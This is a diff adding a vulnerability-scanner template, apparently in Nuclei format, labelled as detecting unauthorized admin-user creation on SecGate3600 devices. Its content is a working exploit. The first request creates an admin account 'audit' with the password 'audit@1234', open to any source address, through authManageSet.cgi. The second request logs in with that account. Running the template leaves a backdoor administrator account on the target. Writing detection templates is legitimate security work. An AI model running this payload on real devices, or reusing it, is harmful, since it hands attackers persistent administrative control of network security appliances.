@@ -1,0 +1,47 @@
+id: secgate3600-unauthorized-add-user
+info:
+  name: Unauthorized Add User in SecGate3600
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access, secgate3600
+  description: |
+    This template detects unauthorized access allowing the addition of an admin user in SecGate3600 devices.
+
+flow: http(1) && http(2)
+
+http:
+  - id: unauthorized-add-user
+    method: POST
+    path:
+      - '{{BaseURL}}/cgi-bin/authUser/authManageSet.cgi'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Requested-With: XMLHttpRequest
+    body: |
+      type=saveAdmin&id=2&userName=audit&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY&allow=Y
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '<msg>0</msg>'
+
+  - id: unauthorized-login
+    method: POST
+    path:
+      - '{{BaseURL}}/cgi-bin/index.cgi'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Requested-With: XMLHttpRequest
+    body: |
+      type=loginCheck&user=audit&pwd=audit%401234
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '<msg>0</msg>'
